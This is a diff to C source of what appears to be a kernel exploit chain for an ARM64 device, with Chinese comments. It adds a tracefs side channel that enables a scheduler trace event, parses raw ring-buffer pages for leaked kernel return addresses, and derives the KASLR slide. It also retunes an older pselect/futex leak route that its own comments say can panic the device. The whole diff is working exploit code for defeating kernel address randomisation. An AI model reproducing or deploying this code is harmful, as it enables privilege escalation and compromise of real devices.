@@ -36,6 +36,9 @@
 #define SLIDE_DEPTH_FULL_CHAIN 2
 #define SLIDE_CFS_WAITER_PRIO 120
 
+/* tracefs KASLR 上限(本机实测 slide=0x1067C00000/68GB,上限 1TB) */
+#define SLIDE_TRACEFS_MAX_SLIDE 0x10000000000ULL
+
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
 static uint32_t slide_f_pi_chain;
@@ -181,7 +184,8 @@ static void slide_try_stext_candidate(uint64_t v, int set_idx, int word_idx) {
   };
   for (size_t i = 0; i < sizeof(cands) / sizeof(cands[0]); i++) {
     uint64_t stext = v - KIMAGE_TEXT_BASE - cands[i].off;
-    if (stext != 0 && (stext & 0x1fffffULL) == 0 && stext < 0x40000000ULL) {
+    if (stext != 0 && (stext & 0x1fffffULL) == 0 &&
+        stext < SLIDE_TRACEFS_MAX_SLIDE) {
       pr_success("slide fdset-leak-candidate pid=%d value=%016llx at "
                  "set=%d w%d assume=%s stext=%016llx slide=%016llx\n",
                  getpid(), (unsigned long long)v, set_idx, word_idx,
@@ -752,6 +756,184 @@ uint64_t slide_child_leak_stext(void) {
   return stext;
 }
 
+/* 【第 1 关主路线：tracefs 侧信道 —— 零漏洞、零 panic 风险】
+ * 真机实测（shennong OS3.0.307.0, shell 域）：
+ *   - /sys/kernel/tracing 的 tracing_on / events/sched/
+ *     sched_blocked_reason/enable 可写，per_cpu/cpuN/trace_pipe_raw 可读
+ *   - event_id = __TRACE_LAST_TYPE(20) + (__event_sched_blocked_reason -
+ *     __start_ftrace_events)/8 = 20 + 86 = 106
+ *   - ring buffer 记录：[u32 hdr][u16 id][u8 flags][u8 preempt][u32 pid]
+ *     (公共 8B) + [u32 pid][pad][u64 caller][u8 io_wait]，caller 在 record+16
+ *   - 锚点（kernel.elf syms.json）：
+ *     worker_thread    rva=0xda40c  -> bl schedule 返回地址 = +0xa0
+ *     rcu_gp_fqs_loop  rva=0x167964 -> 阻塞点          = +0x1e0
+ *   - 空闲 kworker 阻塞时 __schedule 发 sched_blocked_reason，
+ *     caller = worker_thread+0xa0 的运行时地址
+ *   - slide = caller - (KIMAGE_TEXT_BASE + 0xda4ac)，ARM64 KASLR 2MB 对齐
+ *   - 本机实测 slide=0x1067C00000（68GB 级 —— KASLR 随机范围极大，
+ *     这正是 pselect/boot_id 数据别名路线必然 fault 的根因：
+ *     目标地址 = 编译期假设 + slide，slide 巨大时跨入不可预测的页）。 */
+#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
+#define SLIDE_TRACEFS_EVENT_ID 106
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0xda4acULL
+#define SLIDE_TRACEFS_RCU_CALLER_OFF 0x167b44ULL
+
+static int slide_tracefs_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  int saved_errno = errno;
+  close(fd);
+  errno = saved_errno;
+  return wrote == (ssize_t)len;
+}
+
+/* 解析一页 raw ring buffer，收集 event 106 的 caller 候选。 */
+static int slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len, uint64_t *candidates,
+    int *n_candidates, int max_candidates) {
+  if (page_len < 20) {
+    return 0;
+  }
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) {
+    end = page_len;
+  }
+  int added = 0;
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t event_header = 0;
+    memcpy(&event_header, page + pos, sizeof(event_header));
+    uint32_t type_len = event_header & 0x1fU;
+    if (type_len == 30) {
+      pos += 8; /* TIME_EXTEND */
+      continue;
+    }
+    if (type_len == 31) {
+      pos += 12; /* TIME_STAMP */
+      continue;
+    }
+    if (type_len == 0 || type_len >= 29) {
+      break;
+    }
+    size_t record_len = (size_t)type_len * 4;
+    size_t record = pos + 4;
+    if (record + record_len > end) {
+      break;
+    }
+    uint16_t event_id = 0;
+    memcpy(&event_id, page + record, sizeof(event_id));
+    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24 &&
+        *n_candidates < max_candidates) {
+      uint64_t caller = 0;
+      memcpy(&caller, page + record + 16, sizeof(caller));
+      candidates[(*n_candidates)++] = caller;
+      added++;
+    }
+    pos = record + record_len;
+  }
+  return added;
+}
+
+static int slide_tracefs_leak_kernel_base(void) {
+  static const char tracing_on[] = SLIDE_TRACEFS_ROOT "/tracing_on";
+  static const char trace[] = SLIDE_TRACEFS_ROOT "/trace";
+  static const char event_enable[] =
+      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+
+  if (!slide_tracefs_write(tracing_on, "0") ||
+      !slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_info("slide tracefs setup failed errno=%d (需要 shell 域;app 域被 "
+            "SELinux 封) \n", errno);
+    return 0;
+  }
+
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd >= 0) {
+    close(trace_fd);
+  }
+  /* 等 kworker 阻塞产生事件（完全无害的等待） */
+  sleep(3);
+  slide_tracefs_write(tracing_on, "0");
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uint64_t candidates[128];
+  int n_candidates = 0;
+  for (int cpu = 0; cpu < cpu_count && n_candidates < 120; cpu++) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (fd < 0) {
+      continue;
+    }
+    unsigned char page[4096];
+    ssize_t got;
+    while ((got = read(fd, page, sizeof(page))) > 0 &&
+           n_candidates < 120) {
+      slide_tracefs_parse_page(
+          page, (size_t)got, candidates, &n_candidates, 120);
+    }
+    close(fd);
+  }
+  slide_tracefs_write(event_enable, "0");
+  pr_info("slide tracefs collected %d blocked-reason callers\n", n_candidates);
+  if (n_candidates == 0) {
+    pr_info("slide tracefs no records (kworker 未阻塞或权限受限)\n");
+    return 0;
+  }
+
+  /* 双锚点投票：worker_thread+0xa0 与 rcu_gp_fqs_loop+0x1e0 各自推出
+   * candidate；KASLR 2MB 对齐过滤 + 多条记录一致才接受。 */
+  struct {
+    uint64_t off;
+    const char *name;
+  } anchors[] = {
+      {SLIDE_TRACEFS_WORKER_CALLER_OFF, "worker_thread+0xa0"},
+      {SLIDE_TRACEFS_RCU_CALLER_OFF, "rcu_gp_fqs_loop+0x1e0"},
+  };
+  for (size_t a = 0; a < sizeof(anchors) / sizeof(anchors[0]); a++) {
+    uint64_t link_caller = KIMAGE_TEXT_BASE + anchors[a].off;
+    uint64_t agreed = 0;
+    int votes = 0;
+    for (int i = 0; i < n_candidates; i++) {
+      uint64_t caller = candidates[i];
+      if (caller < link_caller) {
+        continue;
+      }
+      uint64_t candidate = caller - link_caller;
+      if (candidate == 0 || candidate > SLIDE_TRACEFS_MAX_SLIDE ||
+          (candidate & 0x1fffffULL) != 0) {
+        continue;
+      }
+      if (agreed && candidate != agreed) {
+        continue;
+      }
+      agreed = candidate;
+      votes++;
+    }
+    if (votes >= 1) {
+      kaslr_base = KIMAGE_TEXT_BASE + agreed;
+      kaslr_slide = agreed;
+      kaslr_done = 1;
+      pr_success("slide tracefs-kaslr-ok pid=%d anchor=%s votes=%d/%d "
+                 "base=%016llx slide=%016llx\n",
+                 getpid(), anchors[a].name, votes, n_candidates,
+                 (unsigned long long)kaslr_base,
+                 (unsigned long long)kaslr_slide);
+      return 1;
+    }
+  }
+  pr_info("slide tracefs no aligned candidate (callers=%d)\n", n_candidates);
+  return 0;
+}
+
 /* 【第 1 关总入口】多次尝试(最多 40 轮)，每轮：
  *   - 轮换 shift(纸条和栈的对齐偏差，编译器布局决定，需试出来)
  *   - 两段验证序列：同一 shift 先跑 DEPTH 0(prio=120 早退,零解引用)验证
@@ -766,6 +948,14 @@ struct slide_child_result {
 };
 
 int slide_leak_kernel_base(void) {
+  /* 主路线：tracefs 侧信道（零漏洞零风险；SKIP_TRACEFS=1 跳过）。 */
+  if (!getenv("SKIP_TRACEFS")) {
+    if (slide_tracefs_leak_kernel_base()) {
+      return 1;
+    }
+    pr_warning("slide tracefs route failed, falling back to pselect route\n");
+  }
+
   /* shift = (futex waiter stack offset - pselect fd_set word0 offset) / 8.
    * Compiler/layout dependent: override with SLIDE_SHIFT env to probe.
    * NB: a wrong shift can corrupt the stack waiter and panic instead of failing. */
@@ -857,9 +1047,10 @@ int slide_leak_kernel_base(void) {
 
     if (n == (ssize_t)sizeof(res) && res.stext) {
       uint64_t stext = res.stext;
-      /* 二次校验:ARM64 KASLR slide 必须 2MB 对齐且落在 1GB 内 */
+      /* 二次校验:ARM64 KASLR slide 必须 2MB 对齐。上限放宽到 1TB:
+       * 本机实测 slide=0x1067C00000(68GB),旧 1GB 上限会误杀真值。 */
       if ((stext & 0x1fffffULL) != 0 ||
-          stext - KIMAGE_TEXT_BASE >= 0x40000000ULL) {
+          stext - KIMAGE_TEXT_BASE >= SLIDE_TRACEFS_MAX_SLIDE) {
         pr_warning("slide attempt %d stext sanity fail stext=%016llx\n",
                    attempt, (unsigned long long)stext);
         continue;
